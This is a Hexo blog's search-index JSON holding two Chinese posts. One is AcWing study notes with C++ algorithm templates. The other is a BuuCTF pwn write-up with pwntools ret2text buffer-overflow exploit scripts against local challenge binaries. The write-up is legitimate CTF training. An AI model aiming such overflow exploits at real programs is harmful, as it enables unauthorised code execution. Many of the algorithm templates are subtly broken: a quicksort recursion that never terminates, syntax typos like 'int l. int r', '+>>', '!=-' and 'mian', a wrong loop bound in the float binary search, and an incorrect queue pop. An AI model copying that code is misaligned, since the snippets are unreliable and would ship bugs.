{"meta":{"title":"【W】","subtitle":null,"description":"Less intrests , more interest .","author":["W"],"url":"https://0410wzn.top","root":"/"},"pages":[{"title":"tags","date":"2021-10-09T10:11:56.000Z","updated":"2021-10-09T10:12:29.226Z","comments":true,"path":"tags/index.html","permalink":"https://0410wzn.top/tags/index.html","excerpt":"","text":""},{"title":"link","date":"2021-11-27T15:41:21.000Z","updated":"2021-11-27T15:41:46.622Z","comments":true,"path":"link/index.html","permalink":"https://0410wzn.top/link/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-10-10T02:36:05.000Z","updated":"2021-10-10T02:36:05.623Z","comments":true,"path":"categories/index.html","permalink":"https://0410wzn.top/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Acwing算法基础学习笔记","slug":"算法基础随笔","date":"2022-01-09T16:00:00.000Z","updated":"2022-01-11T14:31:08.643Z","comments":true,"path":"2022/01/10/算法基础随笔/","link":"","permalink":"https://0410wzn.top/2022/01/10/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E9%9A%8F%E7%AC%94/","excerpt":"","text":"1.基础算法1、排序1、快速排序分治 先分数再递归 (1) 确定分界点：q[ l ]左边界 q[ (l+r)/2 ]中间值 q[ r ]右边界 随机 (2) 调整区间： 使得第一个区间里的数小于等于x。第二个区间里的数大于等于x (3) 递归： 递归左右两段 (2)的”暴力”做法 不推荐优先使用 一、还开两个额外的数组a和b 二、遍历 q[ l ~ r ] 当 q[ i ] &lt;= x，把x放进数组a； ​ 当 q[ i ] &gt; x，把x放进数组b； 三、把a中的数放到q里，b里的数也放在群里 (2)的”优美”做法 使用两个指针，一个在左，一个在右，一起向中间走，当i遇到比x大的数时停下，当k遇到比x小及等于x的数时停下， 当两者都停下，并且指向各不满足条件的数时，使用swap函数交换其指向的值，交换后就继续执行动作，直到中间相遇位置，此时区间已经被一分为二 为什么”优美”？ ——在任意时刻左指针左面的数都小于等于x，右指针的右面的数都大于x； 样例： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;const int N = 1e6 + 10;int n;int q[N];void quick_sort(int q[], int l, int r)&#123; if (l &gt;= r) return; int x = q[l + r &gt;&gt; 1], i = l - 1, j = r + 1; //由于我们的动作是先把指针向内移一 格，所以要开左右大一格的区间 while (i &lt; j) //循环迭代 &#123; do i ++; while (q[i] &lt; x); do j --; while (q[j] &gt; x); if (i &lt; j) swap(q[i],q[j]); //没有swap函数，就设置一个中间变量转换 &#125; //递归处理左右两段 quick_sort(q, l, j); quick_sort(q, j, r);&#125;int main()&#123; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i ++) scanf(&quot;%d&quot;, &amp;q[i]); quick_sort(q, 0, n - 1); for ( int i = 0; i &lt; n; i ++ ) printf(&quot;%d &quot;, q[i]); return 0;&#125; 2、归并排序分治 先递归 (1) 确定分界点：mid = ( l + r ) / 2 (2) 递归排序左右两边 (3) 归并 —— 合二为一(将两个有序的数组合成一个) 两个排好序的数组，比较指针所指位置的数的大小，将小的值存入第三个数组，其指针后移，与另一个数列没动指针所指的数继续比较 时间复杂度 样例 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;using namespace std;const int N = 1000010;int n;int q[N],tmp[N];void merge_sort(int q[], int l. int r)&#123; if (l &gt;= r) return; //判断数是否够 int mid = l + r &gt;&gt; 1; merge_sort(q, l ,mid), merge_sort(q, mid+1, r); //分开排序 int k = 0, i = l, j = mid + 1; //归并 while (i &lt;= mid &amp;&amp; j &lt;= r) //左右都没轮空 if (q[i] &lt;= q[j]) tmp[k++] = q[i++]; else tmp[k ++] = q[j ++]; while (i &lt;= mid) tmp[k++] = q[i++]; while (j &lt;= r) tmp[k++] = q[j ++]; for (i = 1, j = 0; i &lt;= r; i ++, j ++) q[i] = tmp[j];&#125;int main()&#123; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) scanf(&quot;%d&quot;, &amp;q[i]); merge_sort(q, 0, n - 1); for (int i = 0; i &lt; n; i++) printf(&quot;%d &quot;, q[i]); return 0;&#125; 2、二分有单调性一定可以二分，没有单调性也有可能二分 保证答案在区间内部 1、整数二分二分的本质：边界 模板 一、二分红色区域找到红色区间中间值 mid = (l + r) / 2，每次判断其是否满足红色区间划分的性质，再判断答案再那个区间内 二，绿色同理 如何选择用哪个模板？ —— 先写一个check函数，思考该如何更新区间，是l = mid还是r = mid。当l = mid时，补上+1(当l = r - 1时， 因为c++向下取整，循环会进入死胡同)，r = mid则不需。 样例 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;const int N = 1e6 + 10;int n,q;int p[N];int main()&#123; scanf(&quot;%d%d&quot;, &amp;n, &amp;q); for (int i = 0; i &lt; n; i ++) scanf(&quot;%d&quot;, &amp;p[i]); while (q --) &#123; int k; scanf(&quot;%d&quot;, &amp;k); int l = 0, r = n - 1; while (l &lt; r) //求左边界 &#123; int mid = l + r &gt;&gt; 1; if (p[mid] &gt;= k) r = mid; else l = mid + 1; //不满足的话，mid是取不到的 &#125; if (p[l] != k) cout &lt;&lt; &quot;-1 -1&quot; &lt;&lt; endl; //左边界无的话，更别提右了 else &#123; cout &lt;&lt; l &lt;&lt; &#x27; &#x27;; //先输出刚才求的左边界，防止被覆盖 int l = 0, r = n - 1; while (l &lt; r) //求右边界 &#123; int mid = l + r +&gt;&gt; 1; if (p[mid] &lt;= k) l = mid; else r = mid - 1; &#125; cout &lt;&lt; l &lt;&lt; endl; &#125; &#125; return 0;&#125; 2、浮点数二分大致思想差不多，不过由于没有整除，区间长度可以严格缩小一半，当区间长度足够小时，我们可以认为已经找到了答案 样例 123456789101112131415161718192021#include &lt;iotream&gt;using namespace std;int main()&#123; double x; cin &gt;&gt; x; double l = 0, r = x; while (r - 1 &gt; 1e-6) &#123; double mid = (l + r) / 2; if (mid * mid &gt;= x) r = mid; else l = mid; &#125; printf(&quot;%lf\\n&quot;, l); &#125; 3、高精度 主要的四种类型 C++没有大整数类，那C++是怎样存储一个大整数的呢？—— 1个int变量是存不下来的，实际上是把每一位存到数组（最好由高到低例如129，9存到第0位——方便计算时进位）里面去 运算 —— 模拟人工 1、高精度加法 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;const int N = 1e6 + 10;// C = A + Bvector&lt;int&gt; add(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B)&#123; vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || i &lt; B.size(); i ++) &#123; if (i &lt; A.size()) t += A[i]; if (i &lt; B.size()) t += B[i]; C.push_back(t % 10); //写入低位 t /= 10; // &#125; if (t) C.push_back(1); //看最高位 return C; &#125;int main()&#123; string a, b; vector&lt;int&gt; A, B; cin &gt;&gt; a &gt;&gt; b; // a = &quot;123456&quot; for (int i = a.size() - 1; i &gt;= 0; i --) A.push_back(a[i] - &#x27;0&#x27;);//A = [&#x27;6&#x27;...&#x27;1&#x27;] for (int i = b.size() - 1; i &gt;= 0; i --) B.push_back(b[i] - &#x27;0&#x27;); auto C = add(A, B); //auto在声明变量时根据变量初始值的类型自动为变量匹配类型，代替冗长复杂 的变auto量和使用范围专一的变量声明 for (int i = C.size() - 1; i &gt;= 0; i --) printf(&quot;%d&quot;, C[i]); return 0;&#125; 2、高精度减法计算思路 比较大小，看正负 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;const int N = 1e6 + 10;bool cmp(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B) //查看A是否大于等于B&#123; if (A.size() != B.size()) return A.size() &gt; B.size(); //位数不同，直接比大小 for (int i = A.size() - 1; i &gt;= 0; i --) //从高位向低位一个一个比 if (A[i] != B[i]) return A[i] &gt; B[i]; //有不同，直接比 return true; //y &#125;// C = A + Bvector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B)&#123; vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++) &#123; t = A[i] - t; //给t当前A的值 if (i &lt; B.size()) t -= B[i]; //判断减数是否存在 C.push_back((t + 10) % 10); //t是可能小于0的 if (t &lt; 0) t = 1; //查看高位的运算是否减一，即是否借位 else t = 0; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) //留1位(此时这个数在数组的最高位)， 防止差刚好为0 C.pop_back(); //back()函数返回末尾元素的引用，pop_back()则是删除 末尾元素——这里是前几位可能多出来的0 return C;&#125;int main()&#123; string a, b; vector&lt;int&gt;A, B; cin &gt;&gt; a &gt;&gt; b; // a = &quot;123456&quot; for (int i = a.size() - 1; i &gt;= 0; i --) A.push_back(a[i] - &#x27;0&#x27;); //A = [&#x27;6&#x27;...&#x27;1&#x27;] for (int i = b.size() - 1; i &gt;= 0; i --) B.push_back(b[i] - &#x27;0&#x27;); if (cmp(A, B)) //判断A、B大小 &#123; auto C = sub(A, B); //在声明变量时根据变量初始值的类型自动为变量匹配类型，代替冗长复杂的 变量和使用范围专一的变量声明 for (int i = C.size() - 1; i &gt;= 0; i --) printf(&quot;%d&quot;, C[i]); &#125; else &#123; auto C = sub(B, A); printf(&quot;-&quot;); for (int i = C.size() - 1; i &gt;= 0; i --) printf(&quot;%d&quot;, C[i]); &#125; return 0;&#125; 3、高精度乘法 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;vector&gt; using namespace std;vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b)&#123; vector&lt;int&gt; C; int t = 0; //表示进位 for (int i = 0; i &lt; A.size() || t; i ++) &#123; if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); //去掉前几位多余的0 return C;&#125;int main()&#123; string a; int b; cin &gt;&gt; a &gt;&gt; b; // a = &quot;123456&quot; vector&lt;int&gt; A; for (int i = a.size() - 1; i &gt;= 0; i --) A.push_back(a[i] - &#x27;0&#x27;); //A = [&#x27;6&#x27;...&#x27;1&#x27;] auto C = mul(A, b); for (int i = C.size() - 1; i &gt;= 0; i --) printf(&quot;%d&quot;, C[i]); return 0;&#125; 4、高精度除法 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r) // A / B，商是C，余数为r&#123; vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i --) &#123; r = r * 10 + A[i]; C.push_back(r / b); r %= b; &#125; reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;&#125;int main()&#123; string a; int b; cin &gt;&gt; a &gt;&gt; b; // a = &quot;123456&quot; vector&lt;int&gt; A; for (int i = a.size() - 1; i &gt;= 0; i --) A.push_back(a[i] - &#x27;0&#x27;); //A = [&#x27;6&#x27;...&#x27;1&#x27;] int r; auto C = div(A, b, r); for (int i = C.size() - 1; i &gt;= 0; i --) printf(&quot;%d&quot;, C[i]); cout &lt;&lt; endl &lt;&lt; r &lt;&lt; endl; return 0;&#125; 4、前缀和 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;const int N = 100010;int n, m;int a[N], s[N];int main()&#123; scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; i ++) scanf(&quot;%d&quot;, &amp;a[i]); for (int i = 1; i &lt;= n; i ++) s[i] = s[i - 1] + a[i]; //数组的初始化, s[0] = 0 //从1开始，避免下标转换 while (m --) &#123; int l, r; scanf(&quot;%d%d&quot;, &amp;l, &amp;r); printf(&quot;%d\\n&quot;, s[r] - s[l - 1]); //区间和的计算 &#125; return 0;&#125; 二维 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;const int N = 1010;int n, m, q;int a[N][N], s[N][N];int main()&#123; scanf(&quot;%d%d%d&quot;, &amp;n, &amp;m, &amp;q); for (int i = 1; i &lt;= n; i ++) for (int j = 1; j &lt;= m; j ++) scanf(&quot;%d&quot;, &amp;a[i][j]); for (int i = 1; i &lt;= n; i ++) for (int j = 1; j &lt;= m; j ++) s[i][j] = s[i - 1][j] + s[i][j - 1] - s[i - 1][j - 1] + a[i][j]; while (q --) &#123; int x1, y1, x2, y2; scanf(&quot;%d%d%d%d&quot;, &amp;x1, &amp;y1, &amp;x2, &amp;y2); printf(&quot;%d\\n&quot;, s[x2][y2] - s[x1 - 1][y2] - s[x2][y1 - 1] + s[x1 - 1][y1 - 1]); &#125; return 0;&#125; 5、差分(前缀和的逆运算) 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;const int N = 100010;int n, m;int a[N], b[N]; //b[N]是a[N]的差分，a[N]是b[N]的前缀和void insert(int l, int r, int c) //b[i] = a[i] - a[i-1]&#123; b[l] += c; // b[i] = a[i] (在b[1]的时候不用判断减0了) b[r + 1] -= c; // 提前把下一项改减的给它&#125;int main()&#123; scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; i ++) scanf(&quot;%d&quot;, &amp;a[i]); //a[0]为0，后面就不用单独看下标了 for (int i = 1; i &lt;= n; i ++) insert(i, i, a[i]); //这里通过函数建立了a[]和b[]的联系 while (m --) &#123; int l, r, c; scanf(&quot;%d%d%d&quot;, &amp;l, &amp;r, &amp;c); insert(l, r, c); &#125; for (int i = 1; i &lt;= n; i ++) b[i] += b[i - 1]; //求前缀和数组，b[i]就等于b[i]的值和前 //面数和（此时为前一项）的和 for (int i = 1; i &lt;= n; i ++) printf(&quot;%d &quot;, b[i]); return 0;&#125; 假定a数组最开始都是0，那么b数组初始时就是a数组的差分数组了，对于每一个a[i]，相当于插入了一个数，可以直接调用insert函数即可，当然也可以从差分数组的定义出发，for(int i=1;i&lt;=n;i) b[i]=a[i]-a[i-1]; 二维 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;using namespace std;const int N = 1010;int n, m, q;int a[N][N], b[N][N];void insert(int x1, int y1, int x2, int y2, int c)&#123; b[x1][y1] += c; b[x2 + 1][y1] -= c; b[x1][y2 + 1] -= c; b[x2 + 1][y2 + 1] += c;&#125;int main()&#123; scanf(&quot;%d%d%d&quot;, &amp;n, &amp;m, &amp;q); for (int i = 1; i &lt;= n ; i ++) for (int j = 1; j &lt;= m; j ++) scanf(&quot;%d&quot;, &amp;a[i][j]); for (int i = 1; i &lt;= n; i ++) for (int j = 1; j &lt;= m; j ++) insert(i, j, i, j, a[i][j]); while (q --) &#123; int x1, y1, x2, y2, c; cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; c; insert(x1, y1, x2, y2, c); &#125; for (int i = 1; i &lt;= n; i ++) for (int j = 1; j &lt;= m; j ++) b[i][j] += b[i - 1][j] + b[i][j - 1] - b[i - 1][j - 1]; //二维前缀和 for (int i = 1; i &lt;= n; i ++) &#123; for (int j = 1; j &lt;= m; j ++) printf(&quot;%d &quot;, b[i][j]); puts(&quot;&quot;); &#125; return 0;&#125; 6、双指针算法归并排序就属于双指针算法 第一类 —— 两个序列 第二类 —— 一个序列 模板例子 例1： 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;int main()&#123; char str[100]; gets(str); int n = strlen(str); for (int i = 0; i &lt; n; i ++) &#123; int j = i; while (j &lt; n &amp;&amp; str[j] != &#x27; &#x27;) j ++; //问题的具体逻辑 for (int k = i; k &lt; j; k ++) cout &lt;&lt; str[k]; cout &lt;&lt; endl; i = j; &#125; return 0;&#125; 例2： 799 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;const int N = 1e5 + 10;int n;int a[N], s[N];int main()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n; i ++) cin &gt;&gt; a[i]; int res = 0; for (int i = 0, j = 0; i &lt; n; i ++) &#123; s[a[i]] ++; //记录每个数出现多少次 while (s[a[i]] &gt; 1) //多于1，让一个数出去 &#123; s[a[j]] --; j ++; &#125; res = max(res, i - j + 1); //返回最大值 &#125; cout &lt;&lt; res &lt;&lt; endl; return 0;&#125; 7、位运算求n的第k项数字：n &gt;&gt; k &amp; 1 ​ —— n的二进制表示中第k位是n 1234567891011121314#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int main()&#123; int n = 10; for (int k = 3; k &gt;= 0; k --) cout &lt;&lt; (n &gt;&gt; k &amp; 1) &lt;&lt; endl;; return 0;&#125; 返回n的最后一位1： lowbit(n) = n &amp; -n 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int lowbit(int x)&#123; return x &amp; -x;&#125;int main()&#123; int n; cin &gt;&gt; n; while (n --) &#123; int x; cin &gt;&gt; x; int res = 0; while (x) x -= lowbit(x), res ++; //每次减去x的最后一位1 cout &lt;&lt; res &lt;&lt; &#x27; &#x27;; &#125; return 0;&#125; 8、离散化这里特指整数保序的离散化 问题 ​ —— a[n]中有相同元素（去重） ​ —— 如何算出a[i]离散化后的值 – 二分 排完序后，下标就是其映射值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;typedef pair&lt;int, int&gt; PII;const int N = 300010;int n, m;int a[N], s[N]; //s[]为前缀和vector&lt;int&gt; alls; //存储（所有与插入和查询有关的）坐标vector&lt;PII&gt; add, query; //存储插入和询问操作的数据//使用二分查找x所在的位置，此时是alls(x,l,r)排好序的,返回的坐标也会是按照x的大小所给出的；int find(int x)&#123; int l = 0, r = alls.size() - 1; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1; //因为后续要使用前缀和，所以返回的坐标要加上1；&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; m; for (int i = 0; i &lt; n; i ++) &#123; int x, c; cin &gt;&gt; x &gt;&gt; c; add.push_back(&#123;x, c&#125;); alls.push_back(x); //我们要把下标x离散化，先把它加进待离散化的数组里去 &#125; for (int i = 0; i &lt; m; i ++) &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; query.push_back(&#123;l, r&#125;); alls.push_back(l); //左右端点都需要离散化 alls.push_back(r); //查询的区间肯定要和加入时的点对应，都需要映射到一“空间” &#125; //去重 // 将alls进行排序，并将重复的操作删除掉(如进行了两次在x的增值操作，应该去掉一个x保持平衡)； sort(alls.begin(), alls.end()); alls.erase(unique(alls.begin(), alls.end()), alls.end()); //设it是一个迭代器，s.erase(it) 从s中删除迭代器it指向的元素，时间复杂度为O(logn) //unique“去除”相邻的重复元素，返回地址 //处理插入 //一个迭代器从1开始直到末尾结束，itdm.first是x，second是r(在上方循环中可知)； for (auto item : add) &#123; int x = find(item.first); a[x] += item.second; &#125; //预处理前缀和 for (int i = 1; i &lt;= alls.size(); i ++) s[i] = s[i - 1] + a[i]; //处理询问 for (auto item : query) &#123; int l = find(item.first), r = find(item.second); //find函数就是输入映射前的下标，返回在alls中的下标+1。 cout &lt;&lt; s[r] - s[l - 1] &lt;&lt; endl; &#125; return 0;&#125; 9、区间合并有相同部分（包括端点）的多个区间合成一个长的区间 (1) 按区间左端点排序 (2) 扫描的过程中把所有可能有交集的区间合并 三种区间关系 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;using namespace std;typedef pair&lt;int, int&gt; PII; //存储每个区间的两个端点const int N = 100010;int n;vector&lt;PII&gt; segs;void merge(vector&lt;PII&gt; &amp;segs)&#123; vector&lt;PII&gt; res; sort(segs.begin(), segs.end()); int st = -2e9, ed = -2e9; for (auto seg : segs) &#123; if (ed &lt; seg.first) //没有交集 &#123; if (st != 2e9) res.push_back(&#123;st, ed&#125;); st = seg.first, ed = seg.second; &#125; else ed = max(ed, seg.second); &#125; if(st != 2e9) res.push_back(&#123;st, ed&#125;); //防止空集 segs = res;&#125;int mian()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n; i ++) &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; segs.push_back(&#123;l, r&#125;); &#125; merge(segs); cout &lt;&lt; segs.size() &lt;&lt; endl; return 0;&#125; 2、数据结构1、链表与邻接表数组模拟单链表（邻接表用的最多——存储图和树）和双链表（优化） 1、单链表 链表的每一个节点都存储着自己的值和下一个位置的指针 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;iostream&gt;using namespace std;const int N = 100010;// head 表示头结点的下标// e[i] 表示节点i的值// ne[i] 表示节点i的next指针为多少// idx 存储当前用到的点int head, e[N], ne[N], idx;// 初始化void init() &#123; head = -1; idx = 0;&#125;// 将元素插入头节点void add_to_head(int x)&#123; e[idx] = x; ne[idx] = head; // 把插入元素指向头结点指向的元素 head = idx ++; // 将头结点的指针指向插入值,同时idx的值已经使用过了，所以向后移&#125;// 将x插入下标为K的点的后面void add(int k, int x)&#123; e[idx] = x; ne[idx] = ne[k]; ne[k] = idx ++;&#125;// 将下标是k的下一点删掉void remove(int k)&#123; ne[k] = ne[ne[k]]; // 本来ne[k]指向i，再ne一遍就指向了i+1&#125;int main()&#123; int m; cin &gt;&gt; m; init(); while (m --) &#123; int k, x; char op; cin &gt;&gt; op; if (op == &#x27;H&#x27;) &#123; cin &gt;&gt; x; add_to_head(x); &#125; else if (op == &#x27;D&#x27;) &#123; cin &gt;&gt; k; if (!k) head = ne[head]; else remove(k - 1); &#125; else &#123; cin &gt;&gt; k &gt;&gt; x; add(k - 1, x); &#125; &#125; for (int i = head; i != -1; i = ne[i]) cout &lt;&lt; e[i] &lt;&lt; &#x27; &#x27;; cout &lt;&lt; endl; return 0;&#125; PS: 邻接表把每个点的邻边存下来，是一堆单链表 2、双链表 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;const int N = 100010;int m;int e[N], l[N], r[N], idx;// 初始化void init()&#123; // 0表示左端点，1表示右端点 r[0] = 1, l[1] = 0; idx = 2;&#125;// 在第k点右边插入x，左边就为add(l[k], x)void add(int k, int x)&#123; e[idx] = x; r[idx] = r[k]; // x的右指针就是原来k的右指针 l[idx] = k; l[r[k]] = idx; // 先把左指针改了（因为要用到k的右指针表示） r[k] = idx;&#125;// 删除第k个点void remove(int k)&#123; r[l[k]] = r[k]; // r[l[k]]，里面的l[k]指k左边那个数,r[]就是他的右指针 l[r[k]] = l[k];&#125; 2、栈和队列 1、栈1234567891011121314151617#include &lt;iostream&gt;using namespace std;const int N = 100010;// tt 表示栈顶下标int stk[N], tt;// 插入 stk[++ tt] = x;// 弹出 tt --;/* 判断栈是否为空 if (tt &gt; 0) not empty; else empty;*///取出栈顶 stk[tt]; ——单调栈常见的应用场景：给定一个序列，求序列中的每一个数，左边离他最近的比他小的数在什么位置 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;const int N = 100010;int n, tt;int stk[N];int main()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n; i ++) &#123; int x; cin &gt;&gt; x; while (tt &amp;&amp; stk[tt] &gt;= x) tt --; //如果栈顶元素大于当前待入栈元素，则出栈 if (tt) cout &lt;&lt; stk[tt] &lt;&lt; endl; else cout &lt;&lt; -1 &lt;&lt; endl; //如果栈空，则没有比该元素小的值 stk[++ tt] = x; &#125; return 0;&#125; 2、队列123456789101112131415161718192021#include &lt;iostream&gt;using namespace std;const int N = 100010;// hh表示队头，tt表示队尾// 在队尾插入元素，在队头弹出元素int q[N], hh, tt = -1;// 插入元素 q[++ tt] = x;// 弹出元素 tt ++;/* 判断是否为空 if (hh &lt;= tt) not empty; else empty;*/ // 取出队头元素 q[hh] ——单调队列常见的应用场景：求滑动窗口的最大值和最小值 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;const int N = 1000010;int n, k;int a[N], q[N]; //q[N]存的是数组下标int main()&#123; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for (int i = 0; i &lt; n; i ++) scanf(&quot;%d&quot;, &amp;a[i]); int hh = 0, tt = -1; for (int i = 0; i &lt; n; i ++) &#123; // 判断队头是否已经滑出窗口 // hh与tt比较，判断队列是否为空 // 当前滑动窗口的大小(i - k + 1) if (hh &lt;= tt &amp;&amp; i - k + 1 &gt; q[hh]) hh ++; // 如果新数比队尾小，队尾r while (hh &lt;= tt &amp;&amp; a[q[tt]] &gt;= a[i]) tt --; q[++ tt] = i; if (i &gt;= k - 1) printf(&quot;%d&quot;, a[q[hh]]); &#125; puts(&quot;&quot;); return 0;&#125; 3、KMP一个字符串匹配算法，对暴力的那种一一比对的方法进行了优化，使时间复杂度大大降低 例子： http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html https://www.acwing.com/solution/content/14666/ next[i]存储了以i为终点的后缀，和从1开始的长度相等，且这个后缀的长度最长 ==这里的next[5]存储的就是3，即能匹配的最长前缀的末尾字符的下标== 求next[i]思路 KMP匹配思路 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;const int N = 100010, M = 1000010;int n, m;int ne[N];//next数组用来存模式串中每个前缀最长的能匹配前缀子串的结尾字符的下标char s[M], p[N];int main()&#123; cin &gt;&gt; n &gt;&gt; p + 1 &gt;&gt; m &gt;&gt; s + 1; //下标均从1开始 //求next[]数组 //j表示匹配成功的长度,i表示q数组中的下标,因为q数组的下标是从1开始 //的,只有1个时,一定为0,所以i从2开始 for (int i = 2, j = 0; i &lt;= n; i ++) &#123; while (j &amp;&amp; p[i] != p[j + 1]) j = ne[j]; if (p[i] == p[j + 1]) j ++; //成功了就加1 ne[i] = j; //对应其下标 &#125; //j表示匹配成功的长度,因为刚开始还未开始匹配,所以长度为0 for (int i = 1, j = 0; i &lt;= m; i ++) &#123; while (j &amp;&amp; s[i] !=- p[j + 1]) j = ne[j]; //j没有回到开始，且已经匹配好的位置的下一项不再匹配 //就把比较的小串继续再往后移一次，再比较一次 if (s[i] == p[j + 1]) j ++; //匹配成功了,那么j就加1,继续后面的匹配 if (j == n) //满足匹配条件，打印开头下标, 从0开始 &#123; printf(&quot;%d&quot;, i - n); //因为题目中的下标从0开始,所以i-j不用+1; j = ne[j]; //为了观察其后续是否还能跟S数组后面的数配对成功 &#125; &#125; return 0;&#125;","categories":[],"tags":[{"name":"人生苦短，我学pwn","slug":"人生苦短，我学pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6pwn/"}]},{"title":"BuuCTF Pwn WP","slug":"BuuCTF-Pwn-WP","date":"2022-01-06T13:54:07.000Z","updated":"2022-01-11T10:22:14.052Z","comments":true,"path":"2022/01/06/BuuCTF-Pwn-WP/","link":"","permalink":"https://0410wzn.top/2022/01/06/BuuCTF-Pwn-WP/","excerpt":"","text":"BuuCTF Pwn WP题目地址： https://buuoj.cn/challenges rip知识点： re2text 先看一下文件进制和保护措施 很好，什么都没开，我们使用64位的ida分析一下文件 主函数如图 gets()函数存在明显风险，双击s，发现占15个字符 查看函数，发现已有后门函数fun 构造exp，因为pwn1为64位程序，所以要补充8字节填上esp，返回fun的地址 12345678910111213from pwn import *context.arch = &quot;amd64&quot;io = process(&quot;/home/kali/Desktop/pwn1&quot;)fun = 0x401186payload = b&#x27;a&#x27; * (15 + 8) + p64(fun)io.sendline(payload) io.interactive() 本脚本在本地打通了程序，但是当笔者打靶机(Unbuntu18)的时候，却怎么也打不通，为什么呢？ —— ubuntu libc 为 libc2.27，高版本的libc要求是返回地址必须是16字节对齐（也可以说，远程环境是 ubuntu18，64位的程序则需要考虑堆栈平衡的问题） 我们通过添加一个 ret 指令来使16字节对齐 ROPgadget –binary 文件名 –only “pop|ret” 找到ret地址，再次构造exp 1234567891011121314from pwn import *context.arch = &quot;amd64&quot;io = process(&quot;/home/kali/Desktop/pwn1&quot;)ret = 0x401016fun = 0x401186payload = b&#x27;a&#x27; * (15 + 8) + p64(ret) + p64(fun)io.sendline(payload) io.interactive() 打通了！！！ warmup_csaw_2016知识点： re2text 首先检查保护措施 什么都没开，我直呼好耶！ 接着ida分析一下，F5查看伪代码 可以很明显的的发现gets函数存在明显的栈溢出风险，同时我们注意到了sub_40060D函数 其中明显有获取flag的指令，我们的思路很明确了，通过栈溢出，返回到system函数的地址即可 在这里给出两个获取偏移地址的方法： 方法一 我们观察到gets函数读入的是v5，而v5偏移量为0x40，再加上64位ELF文件填充esp需要8字节，即72字节 方法二 使用gdb来获取 使用pattern create 200生成溢出字符，但注意，在生成时要保证其能覆盖到RIP 执行 r 或者 start 命令让程序运行。//注意 start 命令执行后，还需执行 contin 命令。 在 please input 命令后，将之前生成的溢出字符串粘贴上去。 （1）得到RBP寄存器中 ‘AAdAA3AA’ 。往该字符串后，随便复制一串，进行偏移量计算 执行 pattern offset xxxxxx 命令 （2）复制 stack 复制栈顶的字符串 前四个字节（==64 bits为前8个字节==） 计算偏移量 如上 